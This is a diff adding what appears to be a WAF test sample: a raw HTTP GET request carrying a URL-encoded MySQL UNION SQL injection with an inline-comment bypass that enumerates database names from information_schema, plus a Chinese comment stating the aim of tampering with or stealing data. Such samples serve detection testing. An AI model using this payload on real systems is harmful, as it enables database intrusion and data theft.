@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_查询库名(内联注释)
+# 基于UNION查询进行内联注释绕过注入，将"union select schema_name from information_schema.schemata limit 0,1"语句注入到 SQL 查询参数中，目的是获取所有数据库的名称。通过获取所有数据库的名称信息，从而进一步对数据库进行恶意操作，比如篡改用户信息、窃取敏感数据等。
+GET /?id=1%20%2F%2A%21union%20select%20schema_name%20from%20information_schema.schemata%20limit%200%2C1%2A%2F&bid=hd_tag_m8mv26hz HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26hz
+RM-PRO-Token: b0bb1c64bc3649fff9b524e0db850401
+RM-PRO-Time: 1742808619949
+User-Agent: curl/7.83.1
+
